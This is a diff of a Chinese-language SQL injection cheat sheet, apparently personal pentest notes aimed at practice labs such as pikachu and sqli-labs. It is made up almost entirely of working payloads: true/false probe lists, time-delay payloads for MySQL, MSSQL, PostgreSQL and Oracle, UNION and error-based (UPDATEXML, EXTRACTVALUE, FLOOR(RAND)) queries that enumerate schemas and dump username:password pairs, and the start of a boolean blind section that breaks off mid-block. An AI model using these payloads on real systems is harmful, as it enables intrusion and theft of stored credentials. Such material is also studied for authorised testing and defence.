@@ -1,5 +1,12 @@
 SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
 
+一些常用的函数
+
+```
+SUBSTR(string, 1, 2) # 从首个字符开始截取两个字符
+LIMIT 0, 2              # 从首行开始截取两行
+```
+
 ## 1. Entry point
 
 只要与数据库进行交互就可能存在 SQLi
@@ -14,7 +21,7 @@ Cookie: uid=payload
 >
 > 需要闭合 `''` , `""` 和 `()` ; 注意语法要符合 `Types` .
 
-> 在 Burp 中测试必须将特殊符号进行 URL 编码.
+> 使用 Burp 测试必须将 Request Body 中的特殊符号进行 URL 编码
 
 ## 2. Detection
 
@@ -51,30 +58,78 @@ Cookie: uid=payload
 > 可用于判断闭合方式
 
 ```
- OR 1=1      # true
- AND 1=2     # false
- OR 1=1 --   # true
- AND 1=2 --  # false
+ OR 1=1       # true
+ || 1=1       # true
+ AND 1=1      # true
+ && 1=1       # true
+ AND 1=2      # false
+ && 1=2       # false
+ OR 1=1 --    # true
+ || 1=1 --    # true
+ AND 1=1 --   # true
+ &&  1=1 --   # true
+ AND 1=2 --   # false
+ &&  1=2 --   # false
 ' OR 1=1      # true
+' || 1=1      # true
+' AND 1=1     # true
+' && 1=1      # true
 ' AND 1=2     # false
+' && 1=2      # false
 ' OR 1=1 --   # true
+' || 1=1 --   # true
+' AND 1=1 --  # true
+' && 1=1 --   # true
 ' AND 1=2 --  # false
+' && 1=2 --   # false
 " OR 1=1      # true
+" || 1=1      # true
+" AND 1=1     # true
+" && 1=1      # true
 " AND 1=2     # false
+" && 1=2      # false
 " OR 1=1 --   # true
+" || 1=1 --   # true
+" AND 1=1 --  # true
+" && 1=1 --   # true
 " AND 1=2 --  # false
+" && 1=2 --   # false
 ) OR 1=1      # true
+) || 1=1      # true
+) AND 1=1     # true
+) && 1=1      # true
 ) AND 1=2     # false
+) && 1=2      # false
 ) OR 1=1 --   # true
+) || 1=1 --   # true
+) AND 1=1 --  # true
+) && 1=1 --   # true
 ) AND 1=2 --  # false
-') OR 1=1      # true
-') AND 1=2     # false
-') OR 1=1 --   # true
-') AND 1=2 --  # false
-") OR 1=1      # true
-") AND 1=2     # false
-") OR 1=1 --   # true
-") AND 1=2 --  # false
+) && 1=2 --   # false
+') OR 1=1     # true
+') || 1=1     # true
+') AND 1=1    # true
+') && 1=1     # true
+') AND 1=2    # false
+') && 1=2     # false
+') OR 1=1 --  # true
+') || 1=1 --  # true
+') AND 1=1 -- # true
+') && 1=1 --  # true
+') AND 1=2 -- # false
+') && 1=2 --  # false
+") OR 1=1     # true
+") || 1=1     # true
+") AND 1=1    # true
+") && 1=1     # true
+") AND 1=2    # false
+") && 1=2     # false
+") OR 1=1 --  # true
+") || 1=1 --  # true
+") AND 1=1 -- # true
+") && 1=1 --  # true
+") AND 1=2 -- # false
+") && 1=2 --  # false
 ```
 
 > 注意添加注释符时需要闭合 `''` , `""` 和 `()` 
@@ -95,16 +150,16 @@ Cookie: uid=payload
 通过是否执行延时命令判断
 
 ```
-' AND SLEEP(5) --+ # MySQL
-' AND IF(NOW()=SYSDATE(), SLEEP(5), 0) --+ # MySQL
-' XOR (IF(NOW() = SYSDATE(), SLEEP(5), 0)) XOR 'Z # MySQL
-' AND IF(SUBSTRING(@@VERSION, 1, 1) = '5', SLEEP(5), 0) --+ # MySQL
+' AND SLEEP(3) --+ # MySQL
+' AND IF(NOW()=SYSDATE(), SLEEP(3), 0) --+ # MySQL
+' XOR (IF(NOW() = SYSDATE(), SLEEP(3), 0)) XOR 'Z # MySQL
+' AND IF(SUBSTR(@@VERSION, 1, 1) = '5', SLEEP(3), 0) --+ # MySQL
 
 ' WAITFOR DELAY '00:00:05' --+ # MSSQL
 
-'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END --+ # PostgreSQL
+'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(3) ELSE PG_SLEEP(0) END --+ # PostgreSQL
 
-' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE 1 END FROM DUAL)--+ # Oracle
+' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(3) ELSE 1 END FROM DUAL)--+ # Oracle
 ```
 
 使用 URL 编码避免报错
@@ -148,40 +203,7 @@ SELECT * FROM users WHERE id = '%1%';
 SELECT * FROM users WHERE id = "%1%";
 ```
 
-```
-NULL\  # error
-NULL'  # error
-NULL"  # error
-NULL)  # error
-NULL') # error
-NULL") # error
-NULL OR 1=1      # true
-NULL AND 1=2     # false
-NULL OR 1=1 --   # true
-NULL AND 1=2 --  # false
-NULL' OR 1=1      # true
-NULL' AND 1=2     # false
-NULL' OR 1=1 --   # true
-NULL' AND 1=2 --  # false
-NULL" OR 1=1      # true
-NULL" AND 1=2     # false
-NULL" OR 1=1 --   # true
-NULL" AND 1=2 --  # false
-NULL) OR 1=1      # true
-NULL) AND 1=2     # false
-NULL) OR 1=1 --   # true
-NULL) AND 1=2 --  # false
-NULL') OR 1=1      # true
-NULL') AND 1=2     # false
-NULL') OR 1=1 --   # true
-NULL') AND 1=2 --  # false
-NULL") OR 1=1      # true
-NULL") AND 1=2     # false
-NULL") OR 1=1 --   # true
-NULL") AND 1=2 --  # false
-```
-
-### 4.2.  INSERT/UPDATE
+### 4.2.  INSERT/UPDATE/DELETE
 
 基于 INSERT 或 UPDATE 的 SQL 语句
 
@@ -190,26 +212,21 @@ INSERT INTO users (uname) VALUES ('1');
 INSERT INTO users (uname) VALUES ("1");
 UPDATE users SET uname = '1' WHERE id = 1;
 UPDATE users SET uname = "1" WHERE id = 1;
-```
-
-```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR ' # error
-NULL" OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR " # error
+DELETE FROM users WHERE uname = '1';
+DELETE FROM users WHERE uname = "1";
 ```
 
 ## 5. UNION
-
-使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果
 
 ### 5.1 Column count
 
 利用 ORDER BY 判断有几个字段
 
 ```
-NULL' ORDER BY 4 -- 
+' ORDER BY 4 -- 
 ```
 
-> 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段;
+> 当写入 4 个字段时报错，说明有 3 个字段;
 >
 > 可尝试二分法.
 
@@ -218,7 +235,7 @@ NULL' ORDER BY 4 --
 判断回显的位置
 
 ```
-NULL' UNION SELECT 1, 2, 3 -- 
+' UNION SELECT 1, 2, 3 -- 
 ```
 
 > 查询字段数量必须与 `Column count` 相同
@@ -228,13 +245,13 @@ NULL' UNION SELECT 1, 2, 3 --
 在有回显的位置显示所有数据库名
 
 ```
-NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables) -- 
+' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES) -- 
 ```
 
 在有回显的位置显示当前数据库名
 
 ```
-NULL' UNION SELECT 1, 2, DATABASE() -- 
+' UNION SELECT 1, 2, DATABASE() -- 
 ```
 
 亦可查询以下内容
@@ -252,13 +269,13 @@ NULL' UNION SELECT 1, 2, DATABASE() --
 获取指定数据库的所有数据表名
 
 ```
-NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security') -- 
+' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE table_schema='pikachu') -- 
 ```
 
 获取当前数据库的所有数据表名
 
 ```
-NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()) -- 
+' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.TABLES WHERE table_schema=DATABASE()) -- 
 ```
 
 ### 5.4. Columns
@@ -266,44 +283,41 @@ NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schem
 获取指定数据库中指定数据表的所有字段名
 
 ```
-NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users') -- 
+' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users') -- 
 ```
 
 获取当前数据库中指定数据表的所有字段名
 
 ```
-NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users') -- 
+' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users') -- 
 ```
 
 ### 5.5. Dump
 
-获取指定数据库中指定数据表中的所有数据
+获取指定数据库中指定数据表中指定字段的所有数据
 
 ```
-NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users) -- 
+' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users) -- 
 ```
 
-获取当前数据库中指定数据表中的所有数据
+获取当前数据库中指定数据表中指定字段的所有数据
 
 ```
-NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users) -- 
+' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users) -- 
 ```
 
 ## 6. Error
 
-报错注入的常用函数
+以下示例用的是字符型
 
 ```
-UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0)
-EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e))
-FLOOR()
+' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
 ```
 
-报错注入经常存在显示不全的问题, 因此需要分段提取
+若是数字型要改为
 
 ```
-SUBSTRING(string, 1, 2) # 从首个字符开始截取两个字符
-LIMIT 0, 2              # 从首行开始截取两行
+ OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0)
 ```
 
 ### 6.1. Location
@@ -311,19 +325,27 @@ LIMIT 0, 2              # 从首行开始截取两行
 判断是否有回显
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e)) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e)) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(USER(), 1, 1)), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, USER(), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(USER(), 1, 1)), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR(USER(), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR(USER(), 1, 1)), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR(USER(), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ### 6.2. Database
@@ -331,85 +353,107 @@ NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(USER(), 1, 1)), 0x7e)) O
 显示所有数据库名
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e), 0) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e)) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES), 0x7e)) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 1, 1)), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 1, 1)), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES), 1, 1)), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.TABLES), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 显示当前数据库名
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 0) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(DATABASE(), 1, 1)), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, DATABASE(), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(DATABASE(), 1, 1)), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR(DATABASE(), 1, 1)), 0x7e), 0) OR '
 ```
 
-亦可查询以下内容
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR(DATABASE(), 1, 1)), 0x7e)) OR '
+```
 
-| 操作                 | 描述         |
-| -------------------- | ------------ |
-| VERSION()            | MySQL 版本   |
-| USER()               | 数据库用户名 |
-| DATABASE()           | 数据库名     |
-| @@DATADIR            | 数据库路径   |
-| @@VERSION_COMPILE_OS | 系统版本     |
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR(DATABASE(), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
+```
 
 ### 6.3. Tables
 
 获取指定数据库的所有数据表名
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e), 0) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e)) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e)) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR(table_name, 1, 1) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR(table_name, 1, 1) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR(table_name, 1, 1) FROM information_schema.TABLES WHERE table_schema='pikachu' LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 获取当前数据库的所有数据表名
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR(table_name, 1, 1) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR(table_name, 1, 1) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR(table_name, 1, 1) FROM information_schema.TABLES WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ### 6.4. Columns
@@ -417,218 +461,440 @@ NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM i
 获取指定数据库中指定数据表的所有字段名
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e), 0) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users'), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e)) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users'), 0x7e)) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 1, 1)), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users'), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 1, 1)), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users'), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users'), 1, 1)), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema='pikachu' AND table_name='users'), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 获取当前数据库中指定数据表的所有字段名
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 0) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e)) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users'), 0x7e)) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users'), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(column_name) FROM information_schema.COLUMNS WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ### 6.5. Dump
 
-获取指定数据库中指定数据表中指定字段名的所有数据
+获取指定数据库中指定数据表中指定字段的所有数据
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e), 0) OR '
-```
-
-```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 1, 1)), 0x7e), 0) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users), 0x7e)) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 1, 1)), 0x7e)) OR '
-```
-
-获取当前数据库中指定数据表中指定字段名的所有数据
-
-```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 0) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e)) OR '
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users), 1, 1)), 0x7e), 0) OR '
 ```
 
 ```
-NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e), 0) OR '
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users), 1, 1)), 0x7e)) OR '
 ```
 
 ```
-NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e)) OR '
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(username, 0x3A, password) FROM pikachu.users), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
+```
+
+获取当前数据库中指定数据表中指定字段的所有数据
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
+```
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e)) OR '
+```
+
+```
+' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT SUBSTR((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e, FLOOR(RAND(0)*2)) AS a FROM information_schema.TABLES GROUP BY a) AS b)-- 
 ```
 
 ## 7. Bool
 
-当没有回显时，可以根据反馈信息的真假进行注入
+### 7.1. Probe
 
-### 7.1. 爆库
-
-判断数据库长度
-
-> 通过使用 `length` 计算字段的长度判断真假（一个汉字为 3 个字符，一个数字或字母为 1 个字符）
+探测布尔盲注是否可用
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and (length(database()) > 10) --+
+' AND (LENGTH(USER()) > 13) -- # false
 ```
 
 ```
-http://192.168.1.76/sqli-labs/Less-1/?id=1' and (length(database()) = 8) --+
+' AND (LENGTH(USER()) < 15) -- # false
 ```
 
-> 通过二分法缩小范围，当长度为 8 时不报错
+```
